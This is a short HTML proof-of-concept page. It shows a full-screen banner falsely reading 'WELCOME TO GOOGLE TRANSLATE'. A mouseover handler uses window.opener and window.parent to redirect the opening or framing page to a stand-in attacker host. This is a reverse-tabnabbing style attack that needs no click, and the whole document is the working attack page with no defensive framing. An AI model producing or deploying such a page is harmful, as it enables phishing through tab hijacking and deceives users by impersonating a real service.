


<!DOCTYPE html>
<html>
	<head>
		<title>Javascript open link without click</title>
		<style>
			 html, body {
        height: 100%;
        margin: 0px;
    }
			.gfg {
				text-align:center;
				font-size:177px;
				font-weight:bold;
				color:blue;
				background-color:green; 


			}
		</style>
		<script>
			function myFunction() {
if (window.opener) window.opener.parent.location.replace('http://attacker.com');
if (window.parent != window) window.parent.location.replace('http://attacker.com');
			}
		</script>
	</head>
	<body>
		<div class = "gfg" width="100%" height="100%" onmouseover = "myFunction()">
				WELCOME TO GOOGLE TRANSLATE
				
		</div>
	</body>
</html>
